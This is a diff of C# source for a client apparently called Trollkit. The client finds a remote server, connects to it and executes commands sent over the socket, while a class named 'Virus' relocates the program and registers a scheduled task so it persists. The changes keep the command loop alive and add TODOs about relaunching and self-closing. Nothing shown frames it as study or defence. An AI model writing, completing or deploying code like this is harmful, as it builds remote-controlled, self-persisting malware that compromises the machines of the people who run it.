@@ -19,7 +19,6 @@ namespace Trollkit_Client
 
 		static void Main(string[] args)
 		{
-			
 			if (args.Length > 0)
 				if(args[0] == "move-completed")
 				{
@@ -27,27 +26,27 @@ namespace Trollkit_Client
 					var program = new Program();
 					var addresses = program.discover.GetIpAddresses();
 					string ip = program.discover.GetRemoteServerIp(addresses);
-
+					bool crashed = false;
 					Task.Run(() => {
 						program.receiver.ConnectAndReceive(ip);
+						crashed = true;
 					});
 
-					Console.ReadLine();
-					TransferCommandObject returnObject = new TransferCommandObject
-					{ Command = "Debug" };
-					//program.receiver.SendCommandObjectToSocket(ClientServerPipeline.BufferSerialize(returnObject));
+					while(!crashed)
+						Console.ReadLine();
 
-					Console.Read();
 					return;
 				}
 
 
 			Virus virus = new Virus();
 			string randomLocation = virus.FindRandomFileLocation();
+			//TODO: make sure the appliction is restarted with the right parameter.
 			string newFileLocation = "lekker";// virus.MoveFileToLocation(randomLocation);
 			BConsole.WriteLine($"New File location: {newFileLocation}");
 			new TaskSchedulerHelper().CreateTask(newFileLocation);
 
+			//TODO: after above is fixed remove this so the application closes itself
 			Console.Read();
 		}
 
@@ -68,7 +67,7 @@ namespace Trollkit_Client
 		{
 			if(handlers.ContainsKey(Object.Handler))
 			{
-				if (handlers[Object.Handler].HandleCommand(Object))
+				if (handlers[Object.Handler].HandleCommand(s, Object))
 				{
 					BConsole.WriteLine($"Command '{Object.Command}' executed successfully", ConsoleColor.Green);
 				}
